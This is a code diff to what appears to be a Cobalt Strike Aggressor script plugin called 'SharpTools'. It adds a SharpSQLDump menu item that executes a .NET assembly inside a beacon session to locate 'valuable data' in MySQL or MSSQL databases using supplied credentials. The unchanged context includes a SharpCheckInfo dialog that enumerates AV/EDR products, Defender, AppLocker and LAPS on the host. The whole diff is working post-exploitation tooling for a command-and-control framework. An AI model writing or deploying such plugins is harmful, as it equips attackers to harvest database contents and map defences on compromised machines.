@@ -43,6 +43,11 @@ sub SharpSQLTools {
 		}
 }
 
+sub SharpSQLDump {
+		$arg = join(' ', @("-h",$3['host'],"-u",$3['username'],"-p",$3['password'],$3['type']));
+		bexecute_assembly($bid, script_resource("SharpSQLDump.exe"), $arg);
+}
+
 popup beacon_bottom {
     menu "SharpTools" {
         item "SharpEventLog" {
@@ -110,6 +115,17 @@ popup beacon_bottom {
 			$dialog = dialog("SharpCheckInfo", %(Type => "-All",bid => $bid), &SharpCheckInfo);
 			dialog_description($dialog, "Information Gathering");
 			drow_combobox($dialog, "Type", "Type:", @("-All", "-EnvironmentalVariables","-GetRecycle","-AllUserDirectories","-PowershellInfo","-CsharpVersion","-AvProcessEDRproduct","-Defender","-RecentFiles","-NetworkConnentions","-ApplockerEnumerating","-Drives","-LAPS"));
+            dbutton_action($dialog, "Neo Go ~~");
+			dialog_show($dialog);
+        }
+		item "SharpSQLDump" {
+			$bid = $1['@'];
+			$dialog = dialog("SharpSQLDump", %(host => "",username => "",password => "",type => "mysql",bid => $bid), &SharpSQLDump);
+			dialog_description($dialog, "Quickly locate valuable data in database");
+			drow_text($dialog, "host", "host:  ");	
+			drow_text($dialog, "username", "username:  ");	
+			drow_text($dialog, "password", "password:  ");			
+			drow_combobox($dialog, "type", "-mysql/-mssql", @("-mysql", "-mssql"));
             dbutton_action($dialog, "Neo Go ~~");
 			dialog_show($dialog);
         }
